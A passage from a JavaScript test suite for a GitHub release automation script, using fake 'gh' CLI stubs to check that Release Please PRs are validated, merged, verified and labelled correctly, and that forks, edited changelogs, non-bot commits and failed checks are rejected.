    repos/takano536/kobako/git/refs) printf '%s' '{"object":{"sha":"${mergeSha}"}}' ;;
    *) printf '%s\\n' "unknown API path: $path" >&2; exit 1 ;;
  esac
elif [[ "$1" == run ]]; then
  printf '[]'
elif [[ "$1" == workflow ]]; then
  :
else
  printf '%s\\n' "unknown gh invocation: $*" >&2
  exit 1
fi
`,
    );
    await chmod(fakeGh, 0o755);

    const script = path.resolve('scripts/release-automation.mjs');
    const result = spawnSync(process.execPath, [script, 'validate-release-pr'], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${directory}:${process.env.PATH}`,
        FAKE_GH_LOG: log,
        FAKE_PR_OPEN: prOpen,
        FAKE_PR_MERGED: prMerged,
        GITHUB_OUTPUT: output,
        GITHUB_REPOSITORY: 'takano536/kobako',
        GITHUB_EVENT_NAME: 'workflow_dispatch',
        GITHUB_REF: `refs/heads/${RELEASE_BRANCH}`,
        GITHUB_SHA: headSha,
        GATES_OK: 'true',
        PR_NUMBER: '7',
      },
    });
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(log, 'utf8');
    assert.equal((invocations.match(/pulls\/7\/merge/g) || []).length, 1);
    assert.match(
      invocations,
      new RegExp(
        `pulls/7/merge --method PUT --raw-field sha=${headSha} --raw-field merge_method=squash --raw-field commit_title=chore\\(main\\): release 0\\.3\\.1 \\(#7\\)`,
      ),
    );
    assert.match(invocations, new RegExp(`sha=${headSha}`));
    assert.match(invocations, /merge_method=squash/);
    assert.match(invocations, /commit_title=chore\(main\): release 0\.3\.1 \(#7\)/);
    assert.match(invocations, new RegExp(`--ref release-verify/${mergeSha}`));
    const emitted = await readFile(output, 'utf8');
    assert.match(emitted, new RegExp(`merge_sha=${mergeSha}`));

    await rm(`${log}.prcount`, { force: true });
    const stalePrOpen = JSON.stringify(
      releasePr({
        head: {
          ref: RELEASE_BRANCH,
          sha: mergeSha,
          repo: { full_name: 'takano536/kobako', id: 1 },
        },
      }),
    );
    const stale = spawnSync(process.execPath, [script, 'validate-release-pr'], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${directory}:${process.env.PATH}`,
        FAKE_GH_LOG: log,
        FAKE_PR_OPEN: stalePrOpen,
        FAKE_PR_MERGED: prMerged,
        GITHUB_OUTPUT: `${output}.stale`,
        GITHUB_REPOSITORY: 'takano536/kobako',
        GITHUB_EVENT_NAME: 'workflow_dispatch',
        GITHUB_REF: `refs/heads/${RELEASE_BRANCH}`,
        GITHUB_SHA: headSha,
        GATES_OK: 'true',
        PR_NUMBER: '7',
      },
    });
    assert.notEqual(stale.status, 0);
    assert.match(stale.stderr, /head SHA does not match expected/);
  });
});

describe('main self-healing verify dispatch', () => {
  it('creates and dispatches a verify run for a merged pending PR, then refuses a wrong ref object', async () => {
    const directory = await mkdtemp(path.join(os.tmpdir(), 'kobako-release-self-heal-'));
    const fakeGh = path.join(directory, 'gh');
    const log = path.join(directory, 'gh.log');
    const output = path.join(directory, 'github-output');
    const prMerged = JSON.stringify(
      releasePr({
        state: 'closed',
        merged: true,
        merged_at: '2026-10-01T10:02:00Z',
        merge_commit_sha: mergeSha,
      }),
    );
    await writeFile(
      fakeGh,
      `#!/usr/bin/env bash
set -eu
printf '%s\\n' "$*" >>"$FAKE_GH_LOG"
if [[ "$1" == api ]]; then
  path="$2"
  case "$path" in
    repos/takano536/kobako/pulls?state=closed*) printf '[{"number":7,"state":"closed","merged_at":"2026-10-01T10:02:00Z","head":{"ref":"${RELEASE_BRANCH}"},"base":{"ref":"main"},"labels":[{"name":"%s"}]}]' "\${FAKE_LIST_LABEL:-autorelease: pending}" ;;
    repos/takano536/kobako/pulls/7) printf '%s' "$FAKE_PR_MERGED" ;;
    repos/takano536/kobako/git/ref/heads/release-verify/*)
      if [[ -n "\${FAKE_REF_SHA:-}" ]]; then
        printf '{"object":{"sha":"%s"}}' "$FAKE_REF_SHA"
      else
        printf '%s\\n' 'not found' >&2
        exit 1
      fi
      ;;
    repos/takano536/kobako/git/refs) printf '%s' '{"object":{"sha":"${mergeSha}"}}' ;;
    repos/takano536/kobako/actions/workflows/ci.yml/runs?*) printf '{"workflow_runs":[]}' ;;
    *) printf '%s\\n' "unknown API path: $path" >&2; exit 1 ;;
  esac
elif [[ "$1" == workflow ]]; then
  :
else
  printf '%s\\n' "unknown gh invocation: $*" >&2
  exit 1
fi
`,
    );
    await chmod(fakeGh, 0o755);

    const script = path.resolve('scripts/release-automation.mjs');
    const baseEnv = {
      ...process.env,
      PATH: `${directory}:${process.env.PATH}`,
      FAKE_GH_LOG: log,
      FAKE_PR_MERGED: prMerged,
      GITHUB_OUTPUT: output,
      GITHUB_REPOSITORY: 'takano536/kobako',
    };
    const healed = spawnSync(process.execPath, [script, 'ensure-main'], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      env: baseEnv,
    });
    assert.equal(healed.status, 0, healed.stderr || healed.stdout);
    const invocations = await readFile(log, 'utf8');
    assert.match(invocations, new RegExp(`sha=${mergeSha}`));
    assert.match(invocations, new RegExp(`--ref release-verify/${mergeSha}`));
    assert.match(
      invocations,
      new RegExp(
        `actions/workflows/ci.yml/runs\\?event=workflow_dispatch&branch=release-verify%2F${mergeSha}&head_sha=${mergeSha}&per_page=100 --paginate --slurp`,
      ),
    );

    const taggedPr = JSON.stringify(
      releasePr({
        state: 'closed',
        merged: true,
        merged_at: '2026-10-01T10:02:00Z',
        merge_commit_sha: mergeSha,
        labels: [{ name: 'autorelease: tagged' }],
      }),
    );
    const tagged = spawnSync(process.execPath, [script, 'ensure-main'], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      env: {
        ...baseEnv,
        FAKE_LIST_LABEL: 'autorelease: tagged',
        FAKE_PR_MERGED: taggedPr,
        GITHUB_OUTPUT: `${output}.tagged`,
      },
    });
    assert.equal(tagged.status, 0, tagged.stderr || tagged.stdout);
    const afterTagged = await readFile(log, 'utf8');
    assert.equal((afterTagged.match(/workflow run ci\.yml/g) || []).length, 1);

    const wrongRef = spawnSync(process.execPath, [script, 'ensure-main'], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      env: { ...baseEnv, FAKE_REF_SHA: headSha },
    });
    assert.notEqual(wrongRef.status, 0);
    assert.match(wrongRef.stderr, /points at .* expected/);
    const afterWrongRef = await readFile(log, 'utf8');
    assert.equal((afterWrongRef.match(/workflow run ci\.yml/g) || []).length, 1);
  });
});

describe('matching release label recovery', () => {
  it('removes pending and adds tagged exactly like Release Please', async () => {
    const directory = await mkdtemp(path.join(os.tmpdir(), 'kobako-release-label-'));
    const fakeGh = path.join(directory, 'gh');
    const log = path.join(directory, 'gh.log');
    const output = path.join(directory, 'github-output');
    const prMerged = JSON.stringify(
      releasePr({
        state: 'closed',
        merged: true,
        merged_at: '2026-10-01T10:02:00Z',
        merge_commit_sha: mergeSha,
      }),
    );
    await writeFile(
      fakeGh,
      `#!/usr/bin/env bash
set -eu
printf '%s\\n' "$*" >>"$FAKE_GH_LOG"
if [[ "$1" != api ]]; then
  printf '%s\\n' "unknown gh invocation: $*" >&2
  exit 1
fi
path="$2"
case "$path" in
  repos/takano536/kobako/pulls/7) printf '%s' "$FAKE_PR_MERGED" ;;
  repos/takano536/kobako/issues/7/labels/autorelease%3A%20pending) printf '%s' '{}' ;;
  repos/takano536/kobako/issues/7/labels) printf '%s' '{"labels":[{"name":"autorelease: tagged"}]}' ;;
  *) printf '%s\\n' "unknown API path: $path" >&2; exit 1 ;;
esac
`,
    );
    await chmod(fakeGh, 0o755);

    const script = path.resolve('scripts/release-automation.mjs');
    const result = spawnSync(process.execPath, [script, 'ensure-tagged-label'], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${directory}:${process.env.PATH}`,
        FAKE_GH_LOG: log,
        FAKE_PR_MERGED: prMerged,
        GITHUB_OUTPUT: output,
        GITHUB_REPOSITORY: 'takano536/kobako',
        PR_NUMBER: '7',
        MERGE_SHA: mergeSha,
      },
    });
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(log, 'utf8');
    assert.match(invocations, /issues\/7\/labels\/autorelease%3A%20pending --method DELETE/);
    assert.match(
      invocations,
      /issues\/7\/labels --method POST --raw-field labels\[\]=autorelease: tagged/,
    );
    const emitted = await readFile(output, 'utf8');
    assert.match(emitted, /label_state=tagged/);
    assert.match(emitted, /label_updated=true/);
  });
});

describe('canonical open Release PR prefilter', () => {
  it('fetches only listed pending Release PR candidates before full validation', async () => {
    const directory = await mkdtemp(path.join(os.tmpdir(), 'kobako-release-open-'));
    const fakeGh = path.join(directory, 'gh');
    const log = path.join(directory, 'gh.log');
    const output = path.join(directory, 'github-output');
    const prOpen = JSON.stringify(releasePr());
    await writeFile(
      fakeGh,
      `#!/usr/bin/env bash
set -eu
printf '%s\\n' "$*" >>"$FAKE_GH_LOG"
if [[ "$1" == api ]]; then
  path="$2"
  case "$path" in
    repos/takano536/kobako/pulls?state=open*)
      printf '%s' '[{"number":8,"state":"open","head":{"ref":"feature"},"base":{"ref":"main"},"labels":[{"name":"autorelease: pending"}]},{"number":7,"state":"open","head":{"ref":"${RELEASE_BRANCH}"},"base":{"ref":"main"},"labels":[{"name":"autorelease: pending"}]}]'
      ;;
    repos/takano536/kobako/pulls/7) printf '%s' "$FAKE_PR_OPEN" ;;
    repos/takano536/kobako/git/ref/heads/main) printf '%s' '{"object":{"sha":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}' ;;
    *) printf '%s\\n' "unknown API path: $path" >&2; exit 1 ;;
  esac
elif [[ "$1" == workflow ]]; then
  :
else
  printf '%s\\n' "unknown gh invocation: $*" >&2
  exit 1
fi
`,
    );
    await chmod(fakeGh, 0o755);

    const script = path.resolve('scripts/release-automation.mjs');
    const result = spawnSync(process.execPath, [script, 'dispatch-release-pr'], {
      cwd: path.resolve('.'),
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${directory}:${process.env.PATH}`,
        FAKE_GH_LOG: log,
        FAKE_PR_OPEN: prOpen,
        GITHUB_OUTPUT: output,
        GITHUB_REPOSITORY: 'takano536/kobako',
      },
    });
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(log, 'utf8');
    assert.doesNotMatch(invocations, /pulls\/8/);
    assert.match(invocations, /pulls\/7/);
    assert.match(invocations, /expected_head_sha=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/);
  });
});

describe('merge command fail-closed API boundary', () => {
  const cases = [
    [
      'fork',
      { head: { ref: RELEASE_BRANCH, sha: headSha, repo: { full_name: 'attacker/kobako' } } },
    ],
    [
      'other base',
      { base: { ref: 'develop', sha: mainSha, repo: { full_name: 'takano536/kobako' } } },
    ],
    ['missing label', { labels: [] }],
    ['draft', { draft: true }],
    ['edited title', { title: 'chore(main): release 9.9.9' }],
    ['edited body', { body: ':robot:\n---\n\n## 9.9.9\n\nnotes\n\n---\nfooter' }],
  ];

  it.each(cases)('does not PUT for %s', async (_name, overrides) => {
    const fake = await makeReleaseCommandFake({ prOpen: releasePr(overrides) });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake),
      },
    );
    assert.notEqual(result.status, 0);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
  });

  it.each(['failure', 'cancelled', 'pending', 'skipped', 'neutral'])(
    'does not PUT for a %s latest required check',
    async (conclusion) => {
      const checks = allSuccessfulChecks();
      checks[0] = successfulCheck('lint', {
        status: conclusion === 'pending' ? 'in_progress' : 'completed',
        conclusion: conclusion === 'pending' ? null : conclusion,
      });
      const fake = await makeReleaseCommandFake({ checks: { check_runs: checks } });
      const result = spawnSync(
        process.execPath,
        [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
        { cwd: path.resolve('.'), encoding: 'utf8', env: releaseCommandEnv(fake) },
      );
      assert.notEqual(result.status, 0);
      assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
    },
  );

  it('does not PUT when the diff contains a non-Release Please file', async () => {
    const fake = await makeReleaseCommandFake({
      compare: { files: [{ filename: 'scripts/release-automation.mjs' }] },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      { cwd: path.resolve('.'), encoding: 'utf8', env: releaseCommandEnv(fake) },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /non-Release Please files/);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
  });

  it.each([
    [
      'package metadata',
      { FAKE_PACKAGE_MUTATION: '1' },
      /package\.json changes fields other than version/,
    ],
    [
      'manifest metadata',
      { FAKE_MANIFEST_MUTATION: '1' },
      /manifest\.json changes fields other than \./,
    ],
    [
      'extra JSON metadata',
      { FAKE_EXTRA_MUTATION: '1' },
      /apps\/web\/package\.json changes fields other than version/,
    ],
    ['changelog edit', { FAKE_CHANGELOG_FIXTURE: 'mutated' }, /CHANGELOG\.md/],
  ])('does not PUT for a non-version-only %s change', async (_name, extra, message) => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, extra),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, message);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
  });

  it('accepts the historical Release Please #17 insertion with one shared heading', async () => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      { cwd: path.resolve('.'), encoding: 'utf8', env: releaseCommandEnv(fake) },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
  });
  it.each([
    ['CRLF line endings', 'crlf'],
    ['no blank line before the new section', 'no-blank'],
    ['heading-only base with a trailing newline', 'heading-only'],
    ['heading-only base without a trailing newline', 'heading-only-no-newline'],
  ])('accepts a %s changelog update', async (_name, fixture) => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_CHANGELOG_FIXTURE: fixture }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
  });

  it.each([
    ['edited history', 'mutated'],
    ['deleted history', 'deleted'],
    ['reordered history', 'reordered'],
    ['duplicate heading', 'duplicate-heading'],
    ['duplicate heading with indentation and trailing whitespace', 'duplicate-heading-whitespace'],
    ['wrong insertion position', 'wrong-position'],
    ['wrong target version', 'wrong-version'],
    ['bare extra release section', 'bare-extra'],
    ['version-prefix collision', 'version-collision'],
    ['version-prefix collision with a plain heading', 'version-collision-plain'],
    ['spliced history without a line terminator', 'splice-history'],
  ])('rejects a changelog %s', async (_name, fixture) => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_CHANGELOG_FIXTURE: fixture }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
  });

  it('does not PUT when the Release PR head commit is not bot-authored', async () => {
    const fake = await makeReleaseCommandFake({
      commit: {
        parents: [{ sha: mainSha }],
        author: { login: 'human', type: 'User' },
        committer: { login: 'github-actions[bot]', type: 'Bot' },
      },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      { cwd: path.resolve('.'), encoding: 'utf8', env: releaseCommandEnv(fake) },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /head author/);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
  });

  it('does not PUT when the Release PR head commit is not bot-committed', async () => {
    const fake = await makeReleaseCommandFake({
      commit: {
        parents: [{ sha: mainSha }],
        author: { login: 'github-actions[bot]', type: 'Bot' },
        committer: { login: 'human', type: 'User' },
      },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      { cwd: path.resolve('.'), encoding: 'utf8', env: releaseCommandEnv(fake) },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /head committer/);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
  });
  it('does not PUT when github.sha is no longer the PR head', async () => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { GITHUB_SHA: mergeSha }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /pulls\/7\/merge/);
  });
});

describe('merge handoff durability', () => {
  it('fails a 409/405-style merge error when the PR remains open', async () => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_MERGE_MODE: 'error' }),
      },
    );
    assert.notEqual(result.status, 0);
    const invocations = await readFile(fake.log, 'utf8');
    assert.equal((invocations.match(/pulls\/7\/merge/g) || []).length, 1);
    assert.doesNotMatch(invocations, /workflow run ci\.yml/);
  });

  it('recovers when the merge error raced with a successful merge', async () => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_MERGE_MODE: 'error-merged' }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(fake.log, 'utf8');
    assert.equal((invocations.match(/pulls\/7\/merge/g) || []).length, 1);
    assert.match(invocations, /workflow run ci\.yml/);
  });

  it('treats an already merged rerun as a no-op and ensures verify', async () => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_ALWAYS_MERGED: '1' }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(fake.log, 'utf8');
    assert.doesNotMatch(invocations, /pulls\/7\/merge/);
    assert.match(invocations, /workflow run ci\.yml/);
  });
});

describe('paginated release checks and self-healing', () => {
  it('reads required checks from later check-run pages', async () => {
    const firstPage = Array.from({ length: 100 }, (_, index) =>
      successfulCheck(`unrelated-${index}`, { id: index }),
    );
    const fake = await makeReleaseCommandFake({
      checks: [[{ check_runs: firstPage }], [{ check_runs: allSuccessfulChecks() }]],
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'validate-release-pr'],
      { cwd: path.resolve('.'), encoding: 'utf8', env: releaseCommandEnv(fake) },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(await readFile(fake.log, 'utf8'), /check-runs\?per_page=100 --paginate --slurp/);
  });

  it('finds an old pending candidate after paginated PR results', async () => {
    const pages = [
      Array.from({ length: 100 }, (_, index) => ({
        number: 1000 + index,
        state: 'closed',
        merged_at: '2026-10-01T10:02:00Z',
        head: { ref: 'other' },
        base: { ref: 'main' },
        labels: [{ name: 'autorelease: pending' }],
      })),
      [
        {
          number: 7,
          state: 'closed',
          merged_at: '2026-10-01T10:02:00Z',
          head: { ref: RELEASE_BRANCH },
          base: { ref: 'main' },
          labels: [{ name: 'autorelease: pending' }],
        },
      ],
    ];
    const fake = await makeReleaseCommandFake({ list: pages });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'ensure-main'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_ALWAYS_MERGED: '1' }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(fake.log, 'utf8');
    assert.match(
      invocations,
      /pulls\?state=closed&base=main&head=takano536:release-please--branches--main--components--kobako.*--paginate --slurp/,
    );
    assert.match(invocations, /workflow run ci\.yml/);
  });

  it('does not redispatch a failed verify run in scheduled heal mode', async () => {
    const list = [
      {
        number: 7,
        state: 'closed',
        merged_at: '2026-10-01T10:02:00Z',
        head: { ref: RELEASE_BRANCH },
        base: { ref: 'main' },
        labels: [{ name: 'autorelease: pending' }],
      },
    ];
    const fake = await makeReleaseCommandFake({
      list,
      runs: [{ headSha: mergeSha, status: 'completed', conclusion: 'failure' }],
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'heal-main'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_REF_SHA: mergeSha, FAKE_ALWAYS_MERGED: '1' }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /workflow run ci\.yml/);
  });
  it.each([
    ['active', [{ headSha: mergeSha, status: 'in_progress', conclusion: null }]],
    ['successful', [{ headSha: mergeSha, status: 'completed', conclusion: 'success' }]],
  ])('does not dispatch when verify run is %s in main self-heal mode', async (_name, runs) => {
    const fake = await makeReleaseCommandFake({
      list: [
        {
          number: 7,
          state: 'closed',
          merged_at: '2026-10-01T10:02:00Z',
          head: { ref: RELEASE_BRANCH },
          base: { ref: 'main' },
          labels: [{ name: 'autorelease: pending' }],
        },
      ],
      runs,
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'ensure-main'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, { FAKE_ALWAYS_MERGED: '1', FAKE_REF_SHA: mergeSha }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /workflow run ci\.yml/);
  });

  it.each([
    ['arbitrary ref', { GITHUB_REF: 'refs/heads/main', GITHUB_SHA: mergeSha }, /verify ref/],
    [
      'arbitrary sha',
      { GITHUB_REF: `refs/heads/release-verify/${headSha}`, GITHUB_SHA: mergeSha },
      /verify ref/,
    ],
  ])('rejects %s before candidate lookup', async (_name, overrides, message) => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          FAKE_ALWAYS_MERGED: '1',
          GITHUB_REF: overrides.GITHUB_REF,
          GITHUB_SHA: overrides.GITHUB_SHA,
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, message);
  });

  it('rejects a noncanonical verify candidate', async () => {
    const noncanonical = releasePr({
      state: 'closed',
      merged: true,
      merged_at: '2026-10-01T10:02:00Z',
      merge_commit_sha: mergeSha,
      head: {
        ref: 'attacker-branch',
        sha: headSha,
        repo: { full_name: 'takano536/kobako', id: 1 },
      },
    });
    const fake = await makeReleaseCommandFake({
      list: [
        {
          number: 7,
          state: 'closed',
          merged_at: '2026-10-01T10:02:00Z',
          merge_commit_sha: mergeSha,
          head: { ref: 'attacker-branch' },
          base: { ref: 'main' },
          labels: [{ name: 'autorelease: pending' }],
        },
      ],
      prByNumber: { 7: noncanonical },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          GITHUB_SHA: mergeSha,
          GITHUB_REF: `refs/heads/release-verify/${mergeSha}`,
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /head ref is not the Release Please branch/);
  });
});

describe('verify guard metadata and finalization parity', () => {
  it('rejects a Release tag that points at another commit', async () => {
    const fake = await makeReleaseCommandFake({
      list: [
        {
          number: 7,
          state: 'closed',
          merged_at: '2026-10-01T10:02:00Z',
          head: { ref: RELEASE_BRANCH },
          base: { ref: 'main' },
          labels: [{ name: 'autorelease: pending' }],
        },
      ],
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          FAKE_ALWAYS_MERGED: '1',
          FAKE_REF_SHA: mergeSha,
          FAKE_TAG_SHA: headSha,
          GITHUB_SHA: mergeSha,
          GITHUB_REF: `refs/heads/release-verify/${mergeSha}`,
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /release tag v0\.3\.1 points/);
  });

  it('holds finalization when live main Release Please inputs differ from merge', async () => {
    const fake = await makeReleaseCommandFake({
      list: [
        {
          number: 7,
          state: 'closed',
          merged_at: '2026-10-01T10:02:00Z',
          head: { ref: RELEASE_BRANCH },
          base: { ref: 'main' },
          labels: [{ name: 'autorelease: pending' }],
        },
      ],
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-release-inputs'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          FAKE_ALWAYS_MERGED: '1',
          FAKE_PARITY_MISMATCH: '1',
          MERGE_SHA: mergeSha,
          PR_NUMBER: '7',
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /differs from merge/);
  });
});

describe('verify cleanup idempotency', () => {
  it('treats a deleted ref as success and still dispatches main follow-up', async () => {
    const fake = await makeReleaseCommandFake();
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'cleanup-verify'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          FAKE_DELETE_404: '1',
          FAKE_MAIN_SHA: headSha,
          VERIFIED_SHA: mergeSha,
          VERIFY_REF: `release-verify/${mergeSha}`,
        }),
      },
    );
    assert.equal(result.status, 0, result.stderr || result.stdout);
    const invocations = await readFile(fake.log, 'utf8');
    assert.match(invocations, /git\/refs\/heads\/release-verify\/.* --method DELETE/);
    assert.match(invocations, /workflow run ci\.yml .*--ref main .*--field mode=normal/);
  });
});

describe('verify guard candidate uniqueness', () => {
  it('fails closed when more than one canonical merged candidate is listed', async () => {
    const candidate = {
      number: 7,
      state: 'closed',
      merged_at: '2026-10-01T10:02:00Z',
      head: { ref: RELEASE_BRANCH },
      base: { ref: 'main' },
      labels: [{ name: 'autorelease: pending' }],
    };
    const fake = await makeReleaseCommandFake({
      list: [candidate, { ...candidate }],
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          FAKE_ALWAYS_MERGED: '1',
          GITHUB_SHA: mergeSha,
          GITHUB_REF: `refs/heads/release-verify/${mergeSha}`,
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /expected one canonical merged/);
    assert.doesNotMatch(await readFile(fake.log, 'utf8'), /workflow run ci\.yml/);
  });

  it('rejects an input PR number that is not the sole canonical candidate', async () => {
    const fake = await makeReleaseCommandFake({
      list: [
        {
          number: 7,
          state: 'closed',
          merged_at: '2026-10-01T10:02:00Z',
          head: { ref: RELEASE_BRANCH },
          base: { ref: 'main' },
          labels: [{ name: 'autorelease: pending' }],
        },
      ],
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
          FAKE_ALWAYS_MERGED: '1',
          GITHUB_SHA: mergeSha,
          GITHUB_REF: `refs/heads/release-verify/${mergeSha}`,
          PR_NUMBER: '8',
        }),
      },
    );
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /no canonical merged|input PR number 8/);
  });
});

describe('targeted merged Release PR candidate selection', () => {
  const mergedPr = (number, mergeCommitSha, label = 'autorelease: tagged') =>
    releasePr({
      number,
      state: 'closed',
      merged: true,
      merged_at: '2026-10-01T10:02:00Z',
      merge_commit_sha: mergeCommitSha,
      labels: [{ name: label }],
    });
  const listedPr = (pr) => ({
    number: pr.number,
    state: 'closed',
    merged_at: pr.merged_at,
    merge_commit_sha: pr.merge_commit_sha,
    head: { ref: RELEASE_BRANCH },
    base: { ref: 'main' },
    labels: pr.labels,
  });

  it('selects a specified pending PR without counting unrelated tagged history', async () => {
    const taggedSeven = mergedPr(7, recoveryShaOne);
    const taggedNine = mergedPr(9, mergeSha);
    const pendingSeventeen = mergedPr(17, recoveryShaTwo, 'autorelease: pending');
    const fake = await makeReleaseCommandFake({
      list: [listedPr(taggedSeven), listedPr(taggedNine), listedPr(pendingSeventeen)],
      prByNumber: { 7: taggedSeven, 9: taggedNine, 17: pendingSeventeen },
    });
    const result = spawnSync(
      process.execPath,
      [path.resolve('scripts/release-automation.mjs'), 'verify-guard'],
      {
        cwd: path.resolve('.'),
        encoding: 'utf8',
        env: releaseCommandEnv(fake, {
